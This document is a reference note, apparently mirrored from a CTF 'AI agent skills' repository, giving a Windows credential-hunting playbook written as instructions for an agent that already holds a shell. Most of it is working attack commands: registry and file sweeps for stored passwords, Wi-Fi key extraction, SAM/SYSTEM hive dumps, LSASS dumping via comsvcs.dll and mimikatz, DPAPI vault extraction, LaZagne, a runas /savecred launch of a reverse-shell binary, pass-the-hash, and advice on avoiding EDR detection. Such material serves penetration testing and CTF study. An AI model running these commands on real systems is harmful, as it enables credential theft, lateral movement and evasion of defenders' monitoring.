# Windows Credential Hunting

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/host-windows/credential-hunting.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/host-windows/credential-hunting.md)

---

---
name: credential-hunting
category: host-windows
triggers: ["SAM", "SYSTEM hive", "LSASS", "mimikatz", "autologon", "unattend.xml", "cmdkey", "DPAPI", "wifi password", "saved credentials", "findstr password", "secretsdump"]
tools: ["reg", "mimikatz", "secretsdump.py", "cmdkey", "runas", "netsh", "findstr", "powershell", "comsvcs.dll", "LaZagne.exe"]
priority: high
description: Hunt stored Windows credentials - SAM/SYSTEM hives, LSASS, autologon and unattend files, saved creds, DPAPI, and Wi-Fi keys - to escalate or move laterally.
---
# Windows Credential Hunting

## Trigger context
You have a shell (any privilege) and want passwords/hashes for lateral movement or escalation - either directly, or after gaining SYSTEM/SeBackup to unlock protected stores. Many boxes store admin creds in cleartext config, registry, or credential vaults.

## Objective
Recover reusable secrets: local hashes (SAM), domain/cached creds (LSASS), plaintext passwords (autologon, unattend, config files), stored vault creds (cmdkey/DPAPI), and Wi-Fi keys.

## Methodology (decision tree)
1. Quick wins first - cheap, no privilege needed:
   - `cmdkey /list` (saved creds you may `runas`), autologon registry, Wi-Fi keys, history files, config/xml grep.
2. If SYSTEM or SeBackup: dump SAM+SYSTEM (local hashes) and LSASS (logon sessions, cached domain creds).
3. Harvest credential managers and DPAPI blobs; run LaZagne to sweep browsers/apps.
4. Take everything offline: crack SAM/NTLM (hashcat), or pass-the-hash.
5. Feed results to lateral movement / re-auth as a higher-priv user.

## Commands & payloads
Fast, low-priv sweeps:
```cmd
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear
```
Grep filesystem/registry for passwords:
```cmd
findstr /si password *.txt *.ini *.config *.xml *.ps1 *.bat 2>nul
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```
Common credential file locations:
```cmd
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml
type C:\Windows\System32\Sysprep\sysprep.xml
type C:\unattend.xml
dir /s /b C:\*sysprep* C:\*unattend*
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\ProgramData\...\web.config
```
Use saved creds without knowing the password:
```cmd
runas /savecred /user:DOMAIN\admin "C:\Windows\Temp\rev.exe"
```
Dump SAM + SYSTEM (needs SYSTEM or SeBackupPrivilege):
```cmd
reg save HKLM\SAM  C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
```
```bash
# offline on attacker
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```
Dump LSASS (choose one):
```cmd
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <lsass_pid> C:\Temp\lsass.dmp full
```
```text
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
mimikatz # sekurlsa::tickets
```
DPAPI + Credential Manager:
```text
mimikatz # dpapi::cred /in:"%APPDATA%\Microsoft\Credentials\<blob>"
mimikatz # vault::cred /patch
mimikatz # dpapi::masterkey /in:"...\Protect\<SID>\<GUID>" /rpc
```
Broad sweep tool:
```cmd
LaZagne.exe all
```
Get LSASS pid:
```cmd
tasklist /fi "imagename eq lsass.exe"
```

## Branching logic
- Have `cmdkey` entry -> try `runas /savecred` before anything heavier.
- Got autologon `DefaultPassword` cleartext -> reuse directly (often local admin).
- Only low-priv, no SYSTEM -> exhaust config/registry/Wi-Fi/history; if you need hives, first escalate via `token-impersonation-potato` (SeBackup) then return here.
- Dumped NTLM hashes -> pass-the-hash (`psexec.py -hashes`, `evil-winrm -H`) or crack with hashcat mode 1000.
- LSASS blocked by Credential Guard/PPL -> pivot to DPAPI, files, or LaZagne.

## Common pitfalls
- LSASS is protected on modern hosts (RunAsPPL / Credential Guard) - a raw dump fails; comsvcs MiniDump still needs SeDebug/SYSTEM.
- `reg save HKLM\SAM` requires SYSTEM or SeBackup - as a normal user it is Access Denied.
- EDR flags mimikatz and comsvcs MiniDump heavily; prefer offline parsing of a quietly copied hive.
- DPAPI blobs need the user's masterkey (their password or the domain backup key) to decrypt.
- Wi-Fi `key=clear` only reveals keys for profiles this machine stored.
- Unattend passwords are often base64 in the `<Password>` element - decode before use.

## Proof / verification
- secretsdump prints `user:rid:lmhash:nthash:::` - validate by authenticating (`crackmapexec smb HOST -u user -H nthash`).
- `runas /savecred` spawns a process as the saved user - confirm with `whoami`.
- Cleartext password validated by a successful logon (WinRM/SMB/RDP).

## Cross-references
- [sa--instructions--host-windows--token-impersonation-potato.md](https://raw.githubusercontent.com/BigBread57/zametki/main/04-windows/sa--instructions--host-windows--token-impersonation-potato.md) (SeBackup/SeDebug unlock hive/LSASS dumps)
- [sa--instructions--host-windows--windows-enum-winpeas.md](https://raw.githubusercontent.com/BigBread57/zametki/main/04-windows/sa--instructions--host-windows--windows-enum-winpeas.md)
- [sa--instructions--host-windows--uac-and-registry.md](https://raw.githubusercontent.com/BigBread57/zametki/main/04-windows/sa--instructions--host-windows--uac-and-registry.md)

## Credible sources
- HackTricks - Windows Local Privilege Escalation (Credentials): https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html
- HackTricks - Mimikatz: https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/credentials-mimikatz.html
- PayloadsAllTheThings - Windows Privilege Escalation (credential sections): https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
- Impacket secretsdump: https://github.com/fortra/impacket/blob/master/examples/secretsdump.py
- LaZagne: https://github.com/AlessandroZ/LaZagne
- LOLBAS - comsvcs.dll MiniDump: https://lolbas-project.github.io/lolbas/Libraries/comsvcs/
